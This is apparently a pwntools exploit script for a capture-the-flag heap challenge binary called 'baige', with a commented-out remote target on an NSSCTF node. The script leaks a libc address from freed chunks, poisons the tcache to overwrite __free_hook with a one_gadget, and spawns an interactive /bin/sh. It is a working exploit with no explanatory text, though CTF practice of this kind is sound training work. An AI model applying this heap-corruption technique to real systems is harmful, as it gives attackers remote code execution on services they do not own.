from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

io=process("./baige")
# io=remote("node4.anna.nssctf.cn",28702)
elf=ELF("./baige")
libc=ELF("./libc-2.27.so")

def add(n,s,cc):
    io.sendlineafter(b">>\n",b"1")
    io.sendlineafter(b"idx?\n",str(n))
    io.sendlineafter(b"size?\n",str(s))
    io.sendafter(b"content?\n",cc)

def delete(n):
    io.sendlineafter(b">>\n",b"2")
    io.sendlineafter(b"idx?\n",str(n))
    
def edit(n,s,cc):
    io.sendlineafter(b">>\n",b"3")
    io.sendlineafter(b"idx?\n",str(n))
    io.sendlineafter(b"size?\n",str(s))
    io.sendafter(b"content?\n",cc)

def show(n):
    io.sendlineafter(b">>\n",b"4")
    io.sendlineafter(b"idx?\n",str(n))
    
# gdb.attach(io)
# pause()

for i in range(8):
    add(i,0x100,b"a")

add(8,0x100,b"b") #8

for i in range(8):
    delete(i)

for i in range(7):
    add(i,0x100,"d")

add(0,0x10,b"a")
show(0)
leak_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-0x131-libc.sym[b"__malloc_hook"]
print("leak_addr: "+hex(leak_addr))
add(0,0xe0,b"a")

free_hook=leak_addr+libc.sym[b"__free_hook"]
shell=leak_addr+0x4f432

add(1,0x100,b"d")
add(2,0x100,b"d")
add(3,0x100,b"d")
delete(3)
delete(2)

io.sendlineafter(b">>\n",b"1")
io.sendlineafter(b"idx?\n",str(1))
io.sendlineafter(b"size?\n",str(0x421))

edit(1,0x118,cyclic(0x108)+p64(0x101)+p64(free_hook))

add(4,0x100,b"q")
add(5,0x100,b"q")
edit(5,0x20,p64(shell))

delete(1)
    
io.interactive()

# 0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL

# 0x4f432 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a41c execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
